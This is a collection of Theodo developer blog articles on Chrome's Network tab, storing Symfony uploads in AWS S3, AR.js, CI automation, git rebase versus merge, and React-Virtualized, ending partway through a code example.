article
"
										When I started web development, the developer tools were so new to me I thought I would save time not using them in the first place. I quickly realized how wrong I was as I started using them. No more console.log required, debugging became a piece of cake in a lot of cases!
The Network tab is used to track all the interactions between your front end and your back end, thus the network.
In this article, I will show usages of the developer tools Network tab on Google Chrome web browser.
Let’s start exploring the network tab!
Record the network logs
The first thing to do is to record the network logs by making sure the record button is activated before going on the page you want to record: 

Check the response of a request sent to your server
You can keep only the requests sent to your server by clicking on the filter icon and then selecting “XHR”:

In that section, you can see some information about your requests:

HTTP status code
Type of request
Size of the request
Etc.

To get more details about a request, you can simply click on it.
Let’s look at the my-shortcuts endpoint that retrieves the shortcuts of an user connected on the application I am using. You can look at the formatted response by clicking on the “Preview” tab: 

If the response of an XHR is an image, you will be able to preview the image instead.
On this tab, it becomes easy to determine if the format of the response corresponds to what your front end expected.
Great! Now you know how to check the response of a request sent to your server without writing any console.log in your code!
Test your requests with various Internet connection speeds
If the users of the application you are developing have a lower Internet speed than yours, it can be interesting to test your application with custom Internet speed.
It is possible to do so by using bandwidth throttling by clicking on the following dropdown menu:  


Replay a request
Replaying a request can be useful if you want to see how the front end interacts with the response of a request again or if you need to test your request with different parameters. It can be long and painful to reload the page and reproduce exactly the same actions over and over again. Here are some better ways to replay a request:

 When right-clicking on a request, you can copy the cURL format of your request and paste it in the terminal of your computer to send the request to your back end:



 When right-clicking on a request, you can copy the request headers and paste them in your favorite API development environment (e.g. Postman):


In Postman, click on “Headers tab” > “Bulk Edit” to edit the headers:

Now all you need to do is paste your headers. Don’t forget to comment the path of the request which is not a header:  



 If you are using “XHR” requests, you can simply right-click on the request you want to replay and click on “Replay XHR: 


I hope that I could help you debug your network interactions with this article!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jordan Lao
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Why?
Adding upload fields in Symfony application eases the way of managing assets. It makes it possible to upload public assets as well as sensitive documents instantly without any devops knowledge. Hence, I’ll show you a way of implementing a Symfony / Amazon AWS architecture to store your documents in the cloud.
Setup Symfony and AWS
First you need to setup both Symfony and AWS to start storing some files from Symfony in AWS buckets.
Amazon AWS
Creating a bucket on Amazon AWS is really straight forward. First you need to sign up on Amazon S3 (http://aws.amazon.com/s3). Go to the AWS console and search S3. Then click on Create a bucket.
Follow bucket creation process choosing default values (unless you purposely want to give public access to your documents, you should keep your bucket private). Eventually create a directory for each of your environments. Your AWS S3 bucket is now ready to store your documents.
Symfony
Now you need to setup Symfony to be able to store files and to communicate with Amazon AWS. You will need 2 bundles and 1 SDK to set it up:

VichUploader (a bundle that will ease files upload)
KNP/Gauffrette (a bundle that will provide an abstraction layer to use uploaded files in your Symfony application without requiring to know where those files are actually stored)
AWS-SDK (A SDK provided by Amazon to communicate with AWS API)

Install the two bundles and the SDK with composer:

composer require vich/uploader-bundle
composer require aws/aws-sdk-php
composer require knplabs/knp-gaufrette-bundle


Then register the bundles in AppKernel.php

public function registerBundles()
    {
     return [
            	new Vich\UploaderBundle\VichUploaderBundle(),
            	new Knp\Bundle\GaufretteBundle\KnpGaufretteBundle(),
            ];
    }


Bucket parameters
It is highly recommended to use environment variables to store your buckets parameters and credentials. It will make it possible to use different buckets depending on your environment and will prevent credentials from being stored in version control system. Hence, you won’t pollute your production buckets with test files generated in development environment.
You will need to define four parameters to get access to your AWS bucket:

AWS_BUCKET_NAME
AWS_BASE_URL
AWS_KEY (only for and private buckets)
AWS_SECRET_KEY (only for and private buckets)

You can find the values of these parameters in your AWS console.
Configuration
You will have to define a service extending Amazon AWS client and using your AWS credentials.
Add this service in services.yml:

ct_file_store.s3:
        class: Aws\S3\S3Client
        factory: [Aws\S3\S3Client, 'factory']
        arguments:
            -
                version: YOUR_AWS_S3_VERSION (to be found in AWS console depending on your bucket region and version)
                region: YOUR_AWS_S3_REGION
                credentials:
                    key: '%env(AWS_KEY)%'
                    secret: '%env(AWS_SECRET_KEY)%'


Now you need to configure VichUploader and KNP_Gaufrette in Symfony/app/config/config.yml. Use the parameters previously stored in your environment variables.
Here is a basic example:

knp_gaufrette:
    stream_wrapper: ~
    adapters:
        document_adapter:
            aws_s3:
                service_id: ct_file_store.s3
                bucket_name: '%env(AWS_BUCKET_NAME)%'
                detect_content_type: true
                options:
                    create: true
                    directory: document
    filesystems:
        document_fs:
            adapter:    document_adapter

vich_uploader:
    db_driver: orm
    storage: gaufrette
    mappings:
        document:
            inject_on_load: true
            uri_prefix: ""%env(AWS_BASE_URL)%/%env(AWS_BUCKET_NAME)%/document""
            upload_destination: document_fs
            delete_on_update:   false
            delete_on_remove:   false 


Upload files
First step in our workflow is to upload a file from Symfony to AWS. You should create an entity to store your uploaded document (getters and setters are omitted for clarity, you will need to generate them).
The attribute mapping in $documentFile property annotation corresponds to the mapping defined in config.yml. Don’t forget the class attribute @Vich\Uploadable().

namespace MyBundle\Entity;

use Doctrine\ORM\Mapping as ORM;
use Symfony\Component\HttpFoundation\File\File;
use Vich\UploaderBundle\Mapping\Annotation as Vich;

/**
 * Class Document
 *
 * @ORM\Table(name=""document"")
 * @ORM\Entity()
 * @Vich\Uploadable()
 */
class Document
{
    /**
     * @var int
     *
     * @ORM\Column(type=""integer"", name=""id"")
     * @ORM\Id
     * @ORM\GeneratedValue(strategy=""AUTO"")
     */
    private $id;

    /**
     * @var string
     *
     * @ORM\Column(type=""string"", length=255, nullable=true)
     */
    private $documentFileName;

    /**
     * @var File
     * @Vich\UploadableField(mapping=""document"", fileNameProperty=""documentFileName"")
     */
    private $documentFile;

    /**
     * @var \DateTime
     *
     * @ORM\Column(type=""datetime"")
     */
    private $updatedAt;
}


Then you can add an uploaded document to any of your entities:

     /**
     * @var Document
     *
     * @ORM\OneToOne(
     *     targetEntity=""\MyBundle\Entity\Document"",
     *     orphanRemoval=true,
     *     cascade={""persist"", ""remove""},
     * )
     * @ORM\JoinColumn(name=""document_file_id"", referencedColumnName=""id"", onDelete=""SET NULL"")
     */
    private $myDocument;


Create a form type to be able to upload a document:

class UploadDocumentType extends AbstractType
{
    public function buildForm(FormBuilderInterface $builder, array $options)
    {
        add('myDocument', VichFileType::class, [
                'label'         => false,
                'required'      => false,
                'allow_delete'  => false,
                'download_link' => true,
            ]);
    }
...
}


Use this form type in your controller and pass the form to the twig:

...
$myEntity = new MyEntity();
$form = $this->createForm(UploadDocumentType::class, $myEntity);
...
return [ 'form' => $form->createView()];


Finally, add this form field in your twig and you should see an upload field in your form:

<div class=""row"">
    <div class=""col-xs-4"">
        {{ form_label(form.myDocument) }}
    </div>
    <div class=""col-xs-8"">
        {{ form_widget(form.myDocument) }}
    </div>
    <div class=""col-xs-8 col-xs-offset-4"">
        {{ form_errors(form.myDocument) }}
    </div>
</div>


Navigate to your page, upload a file and submit your form. You should now be able to see this document in your AWS bucket.
Users are now able to upload files on your Symfony application and these documents are safely stored on Amazon AWS S3 bucket. The next step is to provide a way to download and display these documents from AWS in your Symfony application.
Display or download documents stored in private buckets
In most cases, your files are stored in private buckets. Here is a step by step way to safely give access to these documents to your users.
Get your document from private bucket
You will need a method to retrieve your files from your private bucket and display it on a custom route. As a result, users will never see the actual route used to download the file. You should define this method in a separate service and use it in the controller.
s3Client is the service (ct_file_store.s3) we defined previously extending AWS S3 client with credentials for private bucket. You will need to inject your bucket name from your environment variables in this service. my-documents/ is the folder you created to store your documents.

     /**
     * @param string $documentName
     *
     * @return \Aws\Result|bool
     */
    public function getDocumentFromPrivateBucket($documentName)
    {
        try {
            return $this->s3Client->getObject(
                [
                    'Bucket' => $this->privateBucketName,
                    'Key'    => 'my-documents/'.$documentName,
                ]
            );
        } catch (S3Exception $e) {
            // Handle your exception here
        }
    }


Define an action with a custom route:
You will need to use the method previously defined to download the file from AWS and expose it on a custom route.

     /**
     * @param Document $document
     * @Route(""/{id}/download-document"", name=""download_document"")
     * @return RedirectResponse|Response
     */
    public function downloadDocumentAction(Document $document)
    {
        $awsS3Uploader  = $this->get('app.service.s3_uploader');

        $result = $awsS3Uploader->getDocumentOnPrivateBucket($document->getDocumentFileName());

        if ($result) {
            // Display the object in the browser
            header(""Content-Type: {$result['ContentType']}"");
            echo $result['Body'];

            return new Response();
        }

        return new Response('', 404);
    }


Download document
Eventually add a download button to access a document stored in a private bucket directly in your Symfony application.

<a href=""{{ path('/download-document', {'id': document.id}) }}"" 
                   target=""_blank"">
   <i class=""fa fa-print"">
   {{ 'label_document_download'|trans }}
</a>


Public assets
You may want to display some assets from Amazon AWS in public pages of your application. To do so, use a public bucket to upload these assets. It is quite straight forward to access it to display them. Be conscious that anyone will be able to access these files outside your application.

<img src=""{{ vich_uploader_asset(myEntity.myDocument, 'documentFile') }}"" alt="""" />



										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Alan Rauzier
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										In this tutorial, you will see how to use ARjs on simple examples in order to discover this technology. You don’t need any huge tech background in order to follow this tutorial.
1 – Your very first AR example
First we will start with a simple example that will help us understand all the elements we need to start an ARjs prototype.
Library import
As I wished to keep it as simple as possible we will only use html static files and javascript libraries. Two external librairies are enough to start with ARjs.
First we need A-Frame library, a web-framework for virtual reality. It is based on components that you can use as tag once defined.
You can import A-Frame library using the folowing line :
<script src=""https://aframe.io/releases/0.6.1/aframe.min.js""></script>

Then we need to import ARjs, the web-framework for augmented reality we are going to use.
<script src=""https://cdn.rawgit.com/jeromeetienne/AR.js/1.5.0/aframe/build/aframe-ar.js""></script>

Initialize the scene
A-Frame works using a scene that contains the elements the user wants to display. To create a new scene, we use the a-scene tag :
<a-scene stats embedded arjs='trackingMethod: best; debugUIEnabled: false'>
  <!-- All our components goes here -->
</a-scene>

Note the 2 elements we have in our a-scene tag :

stats : it displays stats about your application performance. You are free to remove it, but to start it will give us some useful information.
arjs : Here you can find some basic ARjs configuration. trackingMethod is the type of camera tracking you use, here we have choosen which is an auto configuration that will be great for our example. And debugUIEnabled is set at false in order to remove debugging tools from the camera view.

Shape
Then we will use our first a-frame component. A-frame is built around a generic component a-entity that you use and edit to have the behaviour you want.
In this demo, we want to display a cube. Thankfully a components exists in A-frame, already implemented, that can be used to do that :
<a-box position=""0 0 0"" rotation=""0 0 0""></a-box>

a-box has a lot of attributes on which you can learn more in the official documentation, here we will focus on two attributes :

position : the three coordinates that will be used to position our components
rotation : that color of the shape

Marker
We are going to use a Hiro marker to start. It is a special kind of marker designed for augmented reality. We will dig deeper into other markers in one of the following part.

Deployment
As announced we want to make our application accessible from a mobile device, so we will need to deploy our web page and make it accessible from our smartphone.
http-server
There are a lot of node modules that you can use to start a development web server, I choose to use http-server which is very simple and can be used with a single command line.
First you need to install the module by running the following command
npm install -g http-server

Then to launch your server, you can do it with the command line :
http-server

You can use other tools, such as the python based SimpleHTTPServer which is natively available on macOS with the following command:
python -m SimpleHTTPServer 8000

ngrok
Now that your server is running, you need to make your webpage accessible for your mobile device. We are going to use ngrok. It is a very simple command line tool that you can download from here : https://ngrok.com/download.
Then you use ngrok with the following command :
ngrok http 8080

It will redirect all connections to the address : http://xxxxxx.ngrok.io, directly toward your server and your html page.
So with our index.html containing the following :
<!doctype HTML>
<html>
<script src=""https://aframe.io/releases/0.6.1/aframe.min.js""></script>
<script src=""https://rawgit.com/donmccurdy/aframe-extras/master/dist/aframe-extras.loaders.min.js""></script>
<script src=""https://cdn.rawgit.com/jeromeetienne/AR.js/1.5.0/aframe/build/aframe-ar.js""> </script>
  <body style='margin : 0px; overflow: hidden;'>
    <a-scene stats embedded arjs='trackingMethod: best;'>
      <a-marker preset=""hiro"">
      <a-box position='0 1 0' material='color: blue;'>
      </a-box>
      </a-marker>
      <a-entity camera></a-entity>
    </a-scene>
  </body>
</html>

Or if you prefer on codepen.
And the result should look like :

2 – Animation
Now that we were able to display our first A-frame component, we want to make it move.
A-frame contains a component a-animation that has been designed to animate an entity. As A-frame uses tag components, the a-animation has to be inside the entity tag that you want to animate :
  <a-entity>
    <a-animation></a-animation>
  </a-entity>

a-animation can be used on various attributes of our entity such as position, rotation, scale or even color.
We will see in the next part what can be done with these attributes.
Basics
First we will focus on some basic elements that we will need but you will see that it is enough to do a lot of things.

dur : duration of the animation
from : start position or state of the animation
to : end position or state of the animation
repeat : if and how the animation should be repeated

Position
We will begin with the position, we want our object to move from one position to another. To start with this animation, we only need a 3 dimension vector indicating the initial position and the final position of our object.
Our code should look like this :
<a-animation attribute=""position""
    dur=""1000""
    from=""1 0 0""
    to=""0 0 1"">
</a-animation>

Rotation
Rotations work the same, except that instead of a vector you have to indicate three angles :
<a-animation attribute=""rotation""
    dur=""2000""
    from=""0 0 0""
    to=""360 0 0""
    repeat=""indefinite"">
</a-animation>

You can either make your entity rotate on itself:

You can access the full code here.
Or make it rotates around an object:

And the full code is here.
Others properties
This animation pattern works on a lot of others properties, for example :

Scale :

<a-animation
    attribute=""scale""
    to=""2 2 3"">
</a-animation>


Color :

<a-animation
    attribute=""color""
    to=""red"">
</a-animation>

Trigger
a-animation has a trigger : begin. That can either be used with a delay or an event. For example :
<a-animation
    begin=""3000""
    attribute=""color""
    to=""red"">
</a-animation>

This animation will start in 3000ms.
Otherwise with an event you can use :
<a-entity id=""entity"">
<a-animation
    begin=""colorChange""
    attribute=""color""
    to=""red"">
</a-animation>

With the event emission :
document.querySelector('#entity').emit('colorChange');

Combining
You can of course, use multiple animations either by having multiple entities with their own animations or by having imbricated entities that share animation.
First case is very simple you only have to add multiple entities with an animation for each.
Second one is more difficult because you must add an entity inside an entity, like in this example :
<a-entity>
    <a-animation attribute=""rotation""
      dur=""2000""
      easing=""linear""
      from=""0 0 0""
      to=""0 360 0""
      repeat=""indefinite""></a-animation>
          <a-entity rotation=""0 0 25"">
              <a-sphere position=""2 0 2""></a-sphere>
          </a-entity>
</a-entity>

The first entity is used as the axis for our rotating animation.
3 – Model loading
Type of models
You can also load a 3D model inside ARjs and project it on a marker. A-frame works with various models type but glTF is privilegied so you should use it.
You can generate your model from software like Blender. I have not so much experience in this area, but if you are interested you should give a look at this list of tutorials: https://www.blender.org/support/tutorials/
You can also use an online library to download models, some of them even allow you to directly use their models.
Loading a model from the internet
During the building of this tutorial, I found KronosGroup github that allow me to made my very first examples with 3d model. You can find all their work here : https://github.com/KhronosGroup/glTF-Sample-Models
We will now discover a new component from A-frame : a-asset. It is used to load your assets inside A-frame, and as you can guess our 3d model is one of our asset.
To load your 3d model, we will use the following piece of code :
<a-assets>
      <a-asset-item id=""smiley"" src=""https://cdn.rawgit.com/KhronosGroup/glTF-Sample-Models/9176d098/1.0/SmilingFace/glTF/SmilingFace.gltf""></a-asset-item>
</a-assets>

You can of course load your very own model the same way.
a-asset works as a container that will contain the a-asset-item you will need in your page. Those a-asset-item are used to load 3d model.
The full example look like this.
Display your model
Now that we have loaded our model, we can add it into our scene and start manipulating it. To do that we will need to declare an a-entity inside our a-scene that will be binded to the id of our a-asset-item. The code look like :
<a-entity gltf-model=""#smiley"" rotation= ""180 0 0"">
</a-entity>

Remember what we did in the previous part with animation. We are still working with a-entity so we can do the same here. The full code for our moving smiley is here.
And here is a demo :

4 – Markers
For now we only have used Hiro marker, now we will see how we can use other kind of marker.
Barcode
In ARjs barcode are also implemented in case you need to have a lot of different marker without waiting to create them from scratch. You first need to declare in the a-scene component what kind of marker you are looking for :
<a-scene arjs='detectionMode: mono_and_matrix; matrixCodeType: 5x5;'></a-scene>

As you can guess, our value will be found in a 5×5 matrix. And now the a-marker component will look like :
<a-marker type='barcode' value='5'></a-marker>

Custom marker
You can also use your very own custom marker. Select the image you want, and use this tool developed by ARjs developer.
You can then download the .patt file and you can use it in your application, like this:
<a-marker-camera type='pattern' url='path/to/pattern-marker.patt'></a-marker-camera>

Multiple markers
<script src=""https://aframe.io/releases/0.6.0/aframe.min.js""></script>
<script src=""https://jeromeetienne.github.io/AR.js/aframe/build/aframe-ar.js""></script>
<body style='margin : 0px; overflow: hidden;'>
  <a-scene embedded arjs='sourceType: webcam;'>

    <a-marker type='pattern' url='path/to/pattern-marker.patt'>
      <a-box position='0 0.5 0' material='color: red;'></a-box>
    </a-marker>


    <a-marker preset='hiro'>
      <a-box position='0 0.5 0' material='color: green;'></a-box>
    </a-marker>


    <a-marker type='barcode' value='5'>
      <a-box position='0 0.5 0' material='color: blue;'></a-box>
    </a-marker>


    <a-entity camera></a-entity>
  </a-scene>
</body>

What’s next
You now have everything you need to start and deploy a basic AR web application using ARjs.
If you are interested in web augmented or virtual reality you can give a deeper look at the A-Frame library so that you will see you can build more custom component or even component you can interact with.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Bastien Teissier
  			
  				Web developer at Theodo  			
  		
    
			

									"
"
										Stop wasting your time on tasks your CI could do for you.
Find 4 tips on how to better use your CI in order to focus on what matters – and what you love: code. Let’s face it: as a developer, a huge part of the value you create is your code.
Note: Some of these tips use the GitHub / CircleCI combo. Don’t leave yet if you use BitBucket or Jenkins! I use GitHub and CircleCi on my personal and work-related projects, so they are the tools I know best. But most of those tips could be set up with every CI on the market.
Tip 1: Automatic Changelogs
I used to work on a library of React reusable components, like Material UI. Several teams were using components from our library, and with our regular updates, we were wasting a lot of time writing changelogs. We decided to use Conventional Commits. Conventional Commits is a fancy name for commits with a standardized name:
example of Conventional Commits
The standard format is “TYPE(SCOPE): DESCRIPTION OF THE CHANGES”. 
TYPE can be

feat: a new feature on your project
fix: a bugfix
docs: update documentation / Readme
refactor: a code change that neither fixes a bug nor adds a feature
or others…

SCOPE (optional parameter) describes what part of your codebase is changed within the commit.
DESCRIPTION OF THE CHANGES is pretty much what you would write in a “traditional” commit message. However, you can use keywords in your commit message to add more information. For instance:
fix(SomeButton): disable by default to fix IE7 behaviour
BREAKING CHANGE: prop `isDisabled` is now mandatory
Why is this useful? Three main reasons:

Allow scripts to parse the commit names, and generate changelogs with them
Help developers thinking about the impact of their changes (Does my feature add a Breaking Change?)
Allow scripts to choose the correct version bump for your project, depending on “how big” the changes in a commit are (bugfix: x.y.Z, feature: x.Y.z, breaking change: X.y.z)

This standard version bump calculation is called Semantic Versioning. Depending of the version bump, you can anticipate the impact on your app and the amount of work needed.
Be careful though! Not everyone follows this standard, and even those who do can miss a breaking change! You should never update your dependencies without testing everything is fine 😉
How to set up Conventional Commits

Install Commitizen
Install Semantic Releases
Add GITHUB_TOKEN and NPM_TOKEN to the environment variables of your CI
Add `npx semantic-release` after the bundle & tests steps on your CI master/production build
Use `git cz` instead of `git commit` to get used to the commit message standard
Squash & merge your feature branch on master/production branch

When you get used to the commit message standard, you can go back to `git commit`, but remember the format! (e.g: `git commit -m “feat: add an awesome feature”`)
Now, every developer working on your codebase will create changelogs without even noticing it. Plus, if your project is used by others, they only need a glance at your package version/changelog to know what changes you’ve made, and if they are Breaking.
Tip 2a: Run parallel tasks on your CI
Why do I say task instead of tests? Because a CI can do a lot more than run tests! You can:

Generate automatic changelogs 😉 and version your project
Build and push the bundle on a release branch
Deploy your app
Deploy your documentation site

There are several ways to use parallelism to run your tasks.
The blunt approach
This simply consists of using the built-in parallelism of your tasks, combined with a multi-thread CI container.
With Jest, you can choose the number of workers (threads) to use for your test with the `–max-workers` flag.
With Pytest, try xdist and the `-n` flag to split your tests on multiple CPUs.
Another way of parallelizing tests is by splitting the test files between your CI containers, as React tries to do it. However, I won’t write about this approach in this article since the correct way of doing it is nicely explained in the CircleCi docs.
 
Tip 2b: CircleCI Workflows
With Workflows, we reduced our CI Build time by 25% on feature branches (from 11″ to 8″30) and by 30% on our master branch (from 16″30 to 11″30). With an average of 7 features merged on master a day, this is 1 hour and 30 minutes less waiting every day for our team.
Workflow is a feature of CircleCI. Group your tasks in Jobs, then order your Jobs how it suits your project best. Let’s imagine you are building a library of re-usable React Components (huh, I think I’ve already read that somewhere…). Your CI:

Sets up your project (maybe spawn a docker, install your dependencies, build your app)
Runs unit/integration tests
Runs E2E tests
Deploys your Storybook
Publishes your library

Each of those bullet points can be a Job: it may have several tasks in it, but all serve the same purpose. But do you need to wait for your unit tests to pass before launching your E2E tests? Those two jobs are independent and could be running on two different machines.
Our CircleCI workflow
Extract of our config.yml
As you can see, it is pretty straight-forward to re-order or add dependencies between steps. For more info on how to setup Workflows, check out the documentation.
This is also useful for cross-platform testing (you can take a look at Yarn’s workflows).
Note: Having trouble setting up a workflow? You can SSH on the machine during the build.
 
Parallelization drawbacks
But be careful with the parallelism: resources are not unlimited; if you share your CI plan with other teams in your organization, make sure using more resources for parallelism will not be counter-productive at a larger scale. You can easily understand why using 2 machines for 10 minutes can be worse than using 1 machine for 15 minutes:
 
Project #2 is queued on CI because there is no machine free when the build was triggered
 
Plus, sharing the Workspace (the current state) of one machine to others (e.g: after running `yarn`, to make your dependencies installed for every job) costs time (both when saving the state on the first machine and loading it on the other).
So, when should I parallelize my CI tasks?
A good rule of thumb is always keeping jobDuration > (nb_containers * workspaceSharingDuration).
Workspace sharing can take up to a minute for a large codebase. You should try several workflow configurations to find what’s best for you.
 
Tip 3: Set up cron(tab)s
Crontabs help make your CI more reliable without making builds longer.

Want to run in-depth performance tests that need to send requests to your app? Schedule it for night time with a cron!
Want to publish a new version of your app every week? Cron.
Want to train your ML model but it takes hours? Your CI could trigger the training every night.

Some of you may wonder: what is a cron/crontab? Cron(tab) is an abbreviation of ChronoTable, a job scheduler. A cron is a program that executes a series of instructions at a given time. It can be once an hour, once a day, once a year…
I worked on a project in finance linking several sources of data and API’s. Regression was the biggest fear of our client. If you give a user outdated or incorrect info, global financial regulators could issue you a huge fine. Therefore, I built a tool to generate requests with randomized parameters (country, user profile…), play them, and check for regressions. The whole process can take an hour. We run it via our CI, daily, at night, and it saved the client a lot of trouble.
You can easily set up crons on CircleCi if you’ve already tried Jobs/Workflows. Check out the documentation.
Note: Crons use the POSIX date-time notation, which can be a bit tricky at first. Check out this neat Crontab Tester tool to get used to it!
 
Misc tips:

Learn Shell! All Continuous Integration / Continuous Delivery systems can run Shell scripts. Don’t be afraid to sparkle some scripts in your build! Add quick checks between/during tasks to make debugging easier, or make your build fail faster: you don’t want to wait for the full 10 minutes when you can check at 2’30 that your lockfile is not up-to-date!
Use cache on your project dependencies!
Add extra short task to your CI to connect useful tools like Codecov.io or Danger

 
If you have any other tip you would like to share, don’t hesitate!
 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Aurélien Le Masson
  			
  				Developer @ Theodo  			
  		
    
			

									"
"
										Thanks to a new colleague of mine, I have learned how to make my git history cleaner and more understandable. 
The principle is simple: rebase your branch before you merge it. But this technique also has weaknesses. In this article, I will explain what a rebase and a merge really do and what are the implications of this technique.
Basically, here is an example of my git history before and after I used this technique.

Stay focus, rebase and merge are no joke! 
What is the goal of a rebase or a merge ?
Rebase and merge both aim at integrating changes that happened on another branch into your branch.
What happens during a merge ?
First of all there are two types of merge:

Fast-forward merge
3-way merge

Fast-forward merge
A fast-forward merge happens when the most recent shared commit between the two branches is also the tip of the branch in which you are merging.
The following drawing shows what happens during a fast-forward merge and how it is shown on a graphical git software.
A: the branch in which you are merging
B: the branch from which you get the modifications

git checkout A
git merge B


As you can see, git simply brings the new commits on top of branch A. After a fast-forward merge, branches A and B are exactly the same.
Notes:

git checkout A, git rebase B you would have had the exact same result!
git checkout B, git merge A would have left the branches in the “before” situation, since branch A has no new commits for branch B.

3-way merge
A 3-way merge happens when both branches have had new commits since the last shared commit.
The following drawing shows what happens during a 3-way merge and how it is shown in a graphical git software.
A: the branch in which you are merging
B: the branch from which you get the modifications

git checkout A
git merge B


During a 3-way merge, git creates a new commit named “merge commit” (in orange) that contains:

All the modifications brought by the three commits from B (in purple)
The possible conflict resolutions

Git will keep all information about the commits of the merged branch B even if you delete it. On a graphical git software, git will also keep a small loop to represent the merge.
The default behaviour of git is to try a fast-forward merge first. If it’s not possible, that is to say if both branch have had changes since the last shared commit, it will be a 3-way merge.
What happens during a rebase?
A rebase differ from a merge in the way in which it integrates the modifications.
The following drawings show what happens during a rebase and how it is shown in a graphical git software.
A: the branch that you are rebasing
B: the branch from which you get the new commits

git checkout A
git rebase B



When you rebase A on B, git creates a temporary branch that is a copy of branch B, and tries to apply the new commits of A on it one by one.
For each commit to apply, if there are conflicts, they will be resolved inside of the commit.
After a rebase, the new commits from A (in blue) are not exactly the same as they were:

If there were conflicts, those conflicts are integrated in each commit
They have a new hash

But they keep their original date which might be confusing since in the final branch, commits in blue were created before the two last commits in purple.
What is the best solution to integrate a new feature into a shared branch and keep your git tree clean?
Let say that you have a new feature made of three new commits on a branch named `feature`. You want to merge this branch into a shared branch, for exemple `master` that has received two new commits since you started from it.
You have two main solutions: 
First solution: 

git checkout feature
git rebase master
git checkout master
git merge feature


Note : Be careful, git merge feature should do a fast-forward merge, but some hosting services for version control do a 3-way merge anyway. To prevent this, you can use git merge feature –ff-only
Second solution:

git checkout master
git merge feature


As you can see, the final tree is more simple with the first solution. You simply have a linear git history. On the opposite, the second solution creates a new “merge commit” and a loop to show that a merge happened.
In this situation, the git tree is still readable, so the advantage of the first solution is not so obvious. The complexity emerges when you have several developers in your team, and several feature branches developed at the same time. If everyone uses the second solution, your git tree ends up complex with several loop, and it can even be difficult to see which commits belong to which branch!
Unfortunately, the first solution has a few drawbacks:
History rewriting
When you use a rebase, like in the first solution, you “rewrite history” because you change the order of past commits on your branch. This can be problematic if several developers work on the same branch: when you rewrite history, you have to use git push – – force in order to erase the old branch on the remote repository and put your new branch (with the new history) in its place.
This can potentially erase changes another developer made, or introduce conflicts resolution for him.
To avoid this problem, you should only rebase branches on which you are the only one working. For example in our case, if you are the only one working on the feature branch.
However you might sometime have to rewrite history of shared branches. In this case, make sure that the other developers working on the branch are aware of it, and are available to help you if you have conflicts to resolve.
The obvious advantage of the 3-way merge here, is that you don’t rewrite history at all.
Conflicts resolution
When you merge or rebase, you might have to resolve conflicts.
What I like about the rebase, is that the conflicts added by one commit will be resolved in this same commit. On the opposite, the 3-way merge will resolve all the conflicts into the new “merge commit”, mixing all together the conflicts added by the different commits of your feature branch.
The only problem with the rebase is that you may have to resolve more conflicts, due to the fact that the rebase applies the commits of your branch one by one.
Conclusion
To conclude, I hope I have convinced you that rebasing your branch before merging it, can clear your git history a lot! Here is a recap of the advantages and disadvantages of the rebase and merge method versus the 3-way merge method:

 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jérémie Marniquet Fabre
  			
  				I am an agile web developer at Theodo, I enjoy outdoor sports (mountain biking, skiing...) and new technologies !  			
  		
    
			

									"
"
										Why
What is a Virtual DOM ?
The virtual DOM (VDOM) is a programming concept where an ideal, or “virtual”, representation of a UI is kept in memory.
Then, it is synced with the “real” DOM by a library such as ReactDOM. This process is called reconciliation.
Performance and windowing
You might know that React uses this virtual DOM. Thus, it is only when React renders elements that the user will have them into his/her HTML DOM.
Sometimes you might want to display a lot of html elements, like for grids, lists, calendars, dropdowns etc and the user will often complain about performance.

Hence, a good way to display a lot of information is to ‘window’ it. The idea is to create only elements the user can see. An example is the Kindle vs Book. While the book is a heavy object because it ‘renders’ all the pages, the Kindle only display what the user can see.
React-Virtualized
That is how Brian Vaughn came up with the idea of creating React-Virtualized.
It is an open-source library which provides you many components in order to window some of your application List, Grid etc
As a developer, you do not want to reinvent the wheel. React-virtualized is a stable and maintained library. Its community is large and as it is open-source, many modules and extensions are already available in order to window a maximum of elements.
Furthermore, it offers lots of functionalities and customization that you would not even think about.
We will discuss about it later, but before, let’s see when to use React-virtualized.
When
When thinking about performance, lots of actions can be taken, but React official website already got a complete article to be read. In consequence, if you face a performance problem, be sure you have already done all of these before to start to window your application (but stay pragmatic).
How
Getting into it
Ok, now that you’re convinced, let’s go throught the real part.

You can begin by following instructions for installing the right package via npm and look at simple examples here : React virtualized github. However, I’m going to show you a complex example so you can use React-Virtualized in an advanced way.
React-Virtualized 101
To render a windowed list, no need for digging one hour a complex documentation, React-Virtualized is very simple to use.
Firstly, you use the List component from the library, then, the few important props are the next one:

width: the width of the List
height: the height of the List
rowCount: the number of elements you will display
rowHeight: the height of each row you will display
rowRenderer: a callback method to define yourself depending on what you want to do with your data. This method is the core of your list, it is here that you define what will be rendered thanks to your data.

The example

import React from 'react';
import { List } from 'react-virtualized';

// List data as an array of strings
const list = [
 'Easy windowing1',
 'Easy windowing2',
 // And so on...
];

function rowRenderer({
 key, // Unique key within array of rows
 index, // Index of row within collection
 isScrolling, // Used for performance
 isVisible, // Used for performancee
 style, // Style object to be applied to row (to position it)
}) {
 return (

<div key={key} style={style}>
   {list[index]}
 </div>

 );
}

// Render your list
const ListExample = () => (
 <List width={300} height={300} rowCount={list.length} rowHeight={20} rowRenderer={rowRenderer} />
);

Click here to see a demo
A more complex virtualized list:
Display a virtualized list might be easy, but you might have a complicated behaviour to implement.

In this advanced example, we will:

Use the AutoSizer HOC to automatically calculate the size the List will fill
Be able to display row with a dynamic height using the CellMeasurer
Be able to use the CellMeasurer even if the data are not static

This advanced example goes through 4 steps:

Instantiate the AutoSizer and List component
See how the CellMeasurer and the CellMeasurerCache work
Learn how we use them in the rowRenderer
Go further with using these on a list that does not contain a stable number of elements

The example
Let’s look first at how we render the list:
 

import {
 AutoSizer,
 List,
 CellMeasurer,
 CellMeasurerCache,
} from 'react-virtualized';
...
<AutoSizer>
 {({ height, width }) => (
  <List
    width={width}
    height={height}
    rowGetter={({ index }) => rows[index]}
    rowCount={1000}
    rowHeight={40}
